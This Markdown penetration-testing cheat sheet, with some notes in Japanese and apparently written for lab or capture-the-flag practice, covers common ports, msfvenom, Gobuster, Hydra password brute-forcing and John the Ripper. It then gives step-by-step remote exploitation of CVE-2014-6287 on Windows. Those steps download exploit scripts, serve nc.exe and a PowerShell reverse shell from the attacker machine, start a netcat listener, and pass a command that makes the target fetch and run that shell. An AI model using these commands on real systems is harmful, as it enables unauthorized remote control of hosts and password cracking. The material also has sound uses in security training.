# CheatSheet

## Ports
- 20, 21 / FTP
- 22 / SSH
- 23 / Telnet
- 25 / SMTP
- 53 / DNS
- 80 / HTTP
- 110 / POP3
- 443 / HTTPS
- 139, 445 / SMB
- NFS / 2049
- MySQL / 3306

## Tools
### [Nmap](nmap.md)


### MSFVenom
```
msfvenom -p [PAYLOAD] lhost=[LOCAL IP] lport=[LOCAL PORT] R
```

- -p : payload
- lhost : our local host IP address (this is your machine's IP address)
- lport : the port to listen on (this is the port on your machine)
- R : export the payload in raw format


### [Gobuster](https://github.com/OJ/gobuster)
```
gobuster dir -u [URL] -w [WORDLIST PATH] -t [NUM OF THREADS] -x [EXTENSIONS] -q
```

- -u : The target URL
- -w : Path to the wordlist
- -t : Number of concurrent threads (default 10)
- -x : File extension(s) to search for
- -q : Don't print the banner and other noise


### Hydra
Hydra is a very fast online password cracking tool, which can perform rapid dictionary attacks against more than 50 Protocols, including Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, several databases and much more.   
```
hydra -t [NUM OF CONNS] -l [USER] -P [WORDLIST] -vV [IP] [PROTOCOL]
```

- -t : Number of parallel connections per target
- -l : Username
- -P : Wordlist path
- -vV : Sets verbose mode to very verbose, shows the login+pass combination for each attempt


### John the Ripper
```
john --format=[FORMAT] --wordlist=[WORDLIST PATH] [HASH FILE PATH]
```

#### Search format
```
john --list=formats | grep -iF [FORMAT]
```

#### ssh2john (*1)
```
python /usr/share/john/ssh2john.py [KEY FILE PATH] > passphrase.txt
```

## Exploit by protocol
- [SSH](ssh.md)
- [SMB](smb.md)
- [Telnet](telnet.md)
- [NFS](nfs.md)
- [FTP](ftp.md)
- [SMTP](smtp.md)
- [MySQL](mysql.md)

## Windows

### CVE : 2014-6287 ([39161](https://www.exploit-db.com/exploits/39161))
You can execute arbitrary commands on the remote Windows host.

Download the python script to kali
```
wget https://www.exploit-db.com/raw/39161 -O /tmp/39161.py
```

Download netcat binary file.  
39161.pyではあらかじめローカルIP、ポートを指定する必要あり。指定したアドレスから、netcatの実行可能ファイルをnc.exeという名前でダウンロードする仕様。そして、ダウンロードしたnc.exeを実行し、そのローカルIP、ポートにコネクトバックする（リバースシェル）
```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/windows/x86/ncat.exe -O ~/Downloads/steel/nc.exe
```

Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

The following command needs to be executed TWICE.
Download nc.exe first, and connects back to the listner on Kali second time. 
```
python 39161.py $rhost [RPORT]
```

### CVE : 2014-6287 ([49125](https://www.exploit-db.com/exploits/49125))
You can execute arbitrary commands on the remote Windows host.

Download the python script to kali
```
wget https://www.exploit-db.com/raw/49125 -O /tmp/49125.py
```

Download the powershell script to kali.
Local IP and port in the script needs to be changed.
```
wget https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1 -O ~/Downloads/steel/mini-reverse.ps1
```

Start python web server in kali
```
cd ~/Downloads/steel/
python3 -m http.server 80
```

Start netcat listener
```
rlwrap nc -lvnp ${lport}
```

Execute the script
```
cd /tmp
python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
```

## Memo
*1 python3で実行した場合、エラーが発生する。

## Reference

Exploit DB  
https://www.exploit-db.com/

MSF Console Commands  
https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/

Meterpreter Commands  
https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

Reverse Shell Cheat Sheet
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

GTFOBins  
https://gtfobins.github.io/

Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#find-suid-binaries
